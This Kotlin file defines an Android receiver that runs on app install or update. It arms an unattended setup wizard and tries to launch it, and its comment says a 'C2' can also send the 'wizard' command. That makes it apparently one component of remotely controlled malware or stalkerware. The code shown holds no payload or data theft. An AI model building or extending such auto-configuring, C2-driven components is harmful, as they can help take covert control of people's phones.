package com.sp.core

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import com.sp.core.util.Prefs

/**
 * Fires right after the installation or the update of the app.
 *
 * It arms the automatic setup (the wizard runs the whole flow by itself the
 * next time the app is opened) and tries to open the wizard immediately.
 * Android 10+ blocks activity starts from the background, so the open is
 * only a best effort - the wizard runs for sure as soon as the user touches
 * the icon or the C2 sends the "wizard" command.
 */
class SetupLauncherReceiver : BroadcastReceiver() {

    override fun onReceive(ctx: Context, intent: Intent) {
        val action = intent.action ?: return
        if (action != Intent.ACTION_MY_PACKAGE_REPLACED && action != Intent.ACTION_PACKAGE_ADDED) {
            return
        }
        if (action == Intent.ACTION_PACKAGE_ADDED) {
            val pkg = intent.data?.schemeSpecificPart ?: return
            if (pkg != ctx.packageName) return
        }
        try {
            Prefs.set(ctx, LauncherActivity.KEY_AUTO, true)
            Prefs.set(ctx, LauncherActivity.KEY_AUTO_IDX, 0)
        } catch (t: Throwable) {
            Log.w(TAG, "setup arm failed: ${t.message}")
        }
        try {
            val i = Intent(ctx, LauncherActivity::class.java)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            ctx.startActivity(i)
        } catch (t: Throwable) {
            Log.i(TAG, "wizard auto-open blocked: ${t.message}")
        }
    }

    companion object {
        private const val TAG = "SetupLauncher"
    }
}
